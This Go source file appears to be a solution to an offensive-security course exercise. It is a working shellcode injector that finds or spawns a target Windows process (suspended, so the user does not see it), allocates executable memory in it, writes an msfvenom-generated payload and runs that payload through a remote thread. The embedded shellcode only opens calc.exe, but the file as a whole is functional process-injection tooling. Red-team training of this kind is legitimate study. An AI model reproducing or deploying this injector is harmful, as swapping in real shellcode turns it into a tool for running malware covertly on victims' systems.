package main

import (
	"flag"
	"fmt"
	winsyscall "github.com/nodauf/go-windows"
	"golang.org/x/sys/windows"
	"log"
	"os"
	"strings"
	"unsafe"
)

// Base code taken from Exercise 2, refer there if anything is unclear

func init() {
	// Logs will be printing with the line number
	log.SetFlags(log.Llongfile)
}

func injectShellcode(shellcode []byte, pid uint32) {
	// Get a handle on the target process in order to interact with it
	pHandle, err := windows.OpenProcess(winsyscall.PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		log.Fatal("Fail to open process: ", err)
	}
	// "Defer" can be used to clean up resources (pHandle) when the function exits
	defer windows.CloseHandle(pHandle)

	fmt.Println("Got a handle on process: ", pHandle)

	// Allocate RWX memory in the remote process
	// The opsec note from exercise 1 is applicable here, too
	var rPtr uintptr
	rPtr, err = winsyscall.VirtualAllocEx(pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		log.Fatal("Fail allocating executable memory: ", err)
	}

	// Write the payload to the allocated bytes in the remote process
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(pHandle, rPtr, &shellcode[0], uintptr(len(shellcode)), &bytesWritten)
	if err != nil {
		log.Fatal("Fail to write to allocated memory: ", err)
	}
	fmt.Println("WriteProcessMemory is ok. Bytes written: ", bytesWritten)
	fmt.Printf("rPtr: %#x\n", rPtr)

	// Create our remote thread to execute!
	tHandle, err := winsyscall.CreateRemoteThreadEx(pHandle, nil, 0, rPtr, 0, 0, nil)
	defer windows.CloseHandle(tHandle)
	fmt.Println("Started shellcode in thread: ", tHandle)

}

// findProcessByName finds a process by its name and returns its PID
func findProcessByName(processToLookFor string) uint32 {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer windows.CloseHandle(snapshot)
	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))
	if err = windows.Process32First(snapshot, &procEntry); err != nil {
		return 0
	}
	for {
		processName := windows.UTF16PtrToString(&procEntry.ExeFile[0])
		if processName == processToLookFor {
			return procEntry.ProcessID
		}
		err = windows.Process32Next(snapshot, &procEntry)
		if err != nil {
			return 0
		}
	}

}

func main() {
	// Define our shellcode as a Golang byte array (manually modified from the 'csharp' output type)
	// msfvenom -p windows/x64/exec CMD="C:\windows\system32\calc.exe" EXITFUNC=thread -f csharp
	var shellcode = []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
		0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
		0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
		0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
		0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
		0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
		0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
		0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
		0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
		0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
		0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
		0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
		0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
		0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
		0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
		0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
		0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x43, 0x3a, 0x5c,
		0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33,
		0x32, 0x5c, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00}

	// Define process ID (PID) to inject into
	// We use a PID here since resolving process name to PID is a bit more involved in Go
	// See the Go solution for bonus exercise 2 for details
	var processName string
	flag.StringVar(&processName, "process", "", "Process name to inject shellcode into")
	flag.Parse()

	if processName == "" {
		fmt.Println("Please specify a name to inject (or spawn) into")
		os.Exit(1)
	}

	// Adding the '.exe' extension if not defined
	if !strings.HasSuffix(processName, ".exe") {
		processName = processName + ".exe"
	}

	// Find the PID of the process we want to inject into
	pid := findProcessByName(processName)
	// If the process is not found, we start it and retrieve its PID
	if pid == 0 {
		// Use the syscall CreateProcessW to spawn a new suspended process, otherwise os.StartProcess do the job
		// Convert the process name to UTF16
		processNameUTF16, err := windows.UTF16PtrFromString(processName)
		if err != nil {
			log.Fatal("Fail to convert to utf16: ", err)
		}
		var process windows.ProcessInformation
		// Suspend the process, so it doesn't pop up for the user
		err = windows.CreateProcess(nil, processNameUTF16, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &windows.StartupInfo{}, &process)
		if err != nil {
			log.Fatalf("Fail to start %s: %v", processName, err)
		}
		pid = process.ProcessId
		windows.CloseHandle(process.Process)
		fmt.Println("The new process has the pid: ", pid)
	}

	// Inject the shellcode into the process
	injectShellcode(shellcode, uint32(pid))

}
